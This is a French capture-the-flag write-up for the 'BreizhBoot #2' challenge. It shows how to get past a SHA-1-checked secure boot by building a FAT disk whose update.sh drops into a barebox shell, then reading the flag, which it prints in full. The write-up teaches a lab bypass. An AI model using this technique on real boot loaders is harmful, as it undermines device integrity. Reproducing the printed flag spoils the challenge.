# BreizhBoot #2

Le secure-boot est géré via un mécanisme de hash SHA-1. Il est (quasiment) impossible de trouver une collision pour ce dernier. On va donc devoir trouver une autre façon : lorsqu'une image n'est pas présente, un script d'update se lance automatiquement, et on peut le controler !

## Solve

On peut créer un disque avec un script d'update (`update.sh`) qui va nous laisser reprendre la main sur le boot, par exemple en droppant un shell.

```bash
# Create disk and file system (FAT)
dd if=/dev/zero of=fitImage-disk.img bs=1K count=50
mkfs.vfat fitImage-disk.img

# Mount disk
mkdir -p fs
sudo mount -o loop fitImage-disk.img fs/

# Create update.sh with only shell to use barebox's shell
sudo sh -c "echo sh > fs/update.sh"

# Un-mount
sudo umount fs/
```

Ensuite, on lance le client :
`python3 client.py fitImage-disk.img localhost 1337`

Le menu apparait : 
```
[BREIZH-BOOT] Select boot image:
1) fitImage-1
2) fitImage-2
3) fitImage-3
4) fitImage-4
Enter choice: 
>>
```

On sélectionne n'importe quelle image, et le script ajouté va s'executer :

`1`

```
[BREIZH-BOOT] Selected image not found! Running default...
barebox:/ $ cat /mnt/virtioblk1/flag.txt
BZHCTF{Upd4t3s_4r3_p4rt_0f_Th3_S3cur3B00t_Pr0c3ss}
```

## Admin test
Le disque `fitImage-disk-solve.img` résout le challenge.

`python3 client.py ../solve/fitImage-disk-solve.img localhost 1337`


**Flag :**
> BZHCTF{Upd4t3s_4r3_p4rt_0f_Th3_S3cur3B00t_Pr0c3ss}
